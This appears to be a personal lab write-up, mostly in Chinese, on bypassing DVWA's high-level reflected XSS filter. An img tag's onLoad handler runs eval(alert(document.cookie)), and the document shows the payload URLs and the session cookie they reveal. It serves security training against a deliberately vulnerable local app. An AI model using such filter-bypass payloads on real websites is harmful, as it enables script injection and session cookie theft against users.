# Reflected XSS

> The developer now believes they can disable all JavaScript by removing the pattern "<s*c*r*i*p*t".

既然封殺了 `script`，那只好找其他活路

原本是想試試看載入外部 js file 的方向，但還沒試成功 

先試試看 img tag，看有沒有辦法載入其他資源


```
http://dvwa.localtest/vulnerabilities/xss_r/?name=😎<img src='https://picsum.photos/200/300'>😎
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/9871677b-37dc-4bf2-906d-5acf3792bb1a/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220218%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220218T123807Z&X-Amz-Expires=86400&X-Amz-Signature=fd26e2a34b4032d7a1f0569b8d0745eeac7673753d10d7dcc325ea447edd3000&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

但發現用 onLoad 搭配 eval 也值得一試
```javascript
onLoad="eval(alert(1))"
```

```
http://dvwa.localtest/vulnerabilities/xss_r/?name=<img src='https://picsum.photos/200/300' onLoad="eval(alert(1))">
```

### Done

```javascript
onLoad="eval(alert(document.cookie))"
```

```
http://dvwa.localtest/vulnerabilities/xss_r/?name=<img src='https://picsum.photos/200/300' onLoad="eval(alert(document.cookie))">
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/ba183bd6-0efd-4c03-b329-6c6360a202c4/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220218%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220218T123734Z&X-Amz-Expires=86400&X-Amz-Signature=40a12034b3bfc861ef0c14f05fbfddd389da43d4209741558163f330ad28bc8b&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```
PHPSESSID=9e58103f6b5dbdb3ef5f2c726e204e76; security=high
```

### impossible

如果用在 impossible 難度則是無效
